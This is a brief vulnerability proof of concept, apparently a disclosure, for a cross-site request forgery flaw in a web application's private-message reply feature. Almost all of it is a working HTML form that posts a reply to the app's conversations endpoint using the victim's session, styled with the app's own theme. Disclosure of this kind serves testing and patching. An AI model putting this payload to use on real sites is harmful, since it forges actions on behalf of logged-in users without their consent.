# PM Reply CSRF
Allows to send a reply to a private message through CSRF.

## PoC:
```html
<link href="http://localhost/public/themes/Sand/assets/css/sand.css" rel="stylesheet">

<form id="%form_id%" action="http://localhost/conversations.php/cmd/reply/id/1" method="POST" style="padding: 25px;">
    <textarea id="editor" style="width: 100%; height: 300px;" name="content"></textarea>
    <p class="pull-right" style="margin-top:5px;">
        <input type="submit" name="reply" value="Post Reply">
    </p>
</form>
```
